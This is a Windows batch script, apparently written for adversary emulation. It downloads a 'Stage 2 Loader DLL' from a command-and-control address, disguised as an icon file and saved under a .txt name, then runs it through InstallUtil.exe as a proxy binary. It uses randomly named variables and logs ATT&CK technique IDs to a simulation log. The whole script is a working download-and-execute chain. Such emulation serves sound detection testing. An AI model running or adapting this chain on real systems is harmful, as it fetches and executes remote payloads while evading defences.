@echo off
SETLOCAL EnableDelayedExpansion

REM Placeholder constant declarations (random-named SET vars)
SET a1=%APPDATA%\11063\e43bc5bf
SET b2=dd246ed4.txt
SET c3=https://10.0.0.49/stage/2/icon.png?11063-7
SET d4=ITZEL-S2BO
SET e5=11063
SET f6=7
SET g7=%PUBLIC%\\macula-simulations.log

REM Timestamp for debug logging
SET tsvar=!DATE!/!TIME!

REM 1. Heartbeat fetch – download Stage 2 Loader DLL from C2
echo [!tsvar!][DEBUG][!d4!][!e5!]: heartbeat_start>> "!g7!" 2>nul
curl -k -s -o "!a1!\!b2!" "!c3!"
set ha_ec=%errorlevel%
if !ha_ec! equ 0 (
    echo [!tsvar!][DEBUG][!d4!][!e5!]: heartbeat_complete=0>> "!g7!" 2>nul
    set ha_res=OK
    set ha_err=
) else (
    echo [!tsvar!][DEBUG][!d4!][!e5!]: heartbeat_fail=!ha_ec!>> "!g7!" 2>nul
    set ha_res=FAIL
    set ha_err=curl_exit_!ha_ec!
)

REM 2. Change working directory to output directory
echo [!tsvar!][DEBUG][!d4!][!e5!]: chdir_start>> "!g7!" 2>nul
cd /d "!a1!"
if %errorlevel% equ 0 (
    echo [!tsvar!][DEBUG][!d4!][!e5!]: chdir_result=0>> "!g7!" 2>nul
    set cd_res=OK
    set cd_err=
) else (
    echo [!tsvar!][DEBUG][!d4!][!e5!]: chdir_result=1>> "!g7!" 2>nul
    set cd_res=FAIL
    set cd_err=chdir_fail
)

REM 3. Invoke downloaded Stage 2 Loader DLL via InstallUtil (LOLBIN)
echo [!tsvar!][DEBUG][!d4!][!e5!]: installutil_start>> "!g7!" 2>nul
%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U "!b2!" >NUL 2>&1
set il_ec=%errorlevel%
if !il_ec! equ 0 (
    echo [!tsvar!][DEBUG][!d4!][!e5!]: installutil_result=0>> "!g7!" 2>nul
    set il_res=OK
    set il_err=
) else (
    echo [!tsvar!][DEBUG][!d4!][!e5!]: installutil_result=!il_ec!>> "!g7!" 2>nul
    set il_res=FAIL
    set il_err=installutil_exit_!il_ec!
)

REM 4. TTP logging – one line per technique
echo [!tsvar!][TTP][!d4!][!e5!]: T1218^|System Binary Proxy Execution=!il_res!:!il_err!>> "!g7!" 2>nul
echo [!tsvar!][TTP][!d4!][!e5!]: T1027^|Obfuscated Files or Information=!ha_res!:!ha_err!>> "!g7!" 2>nul

ENDLOCAL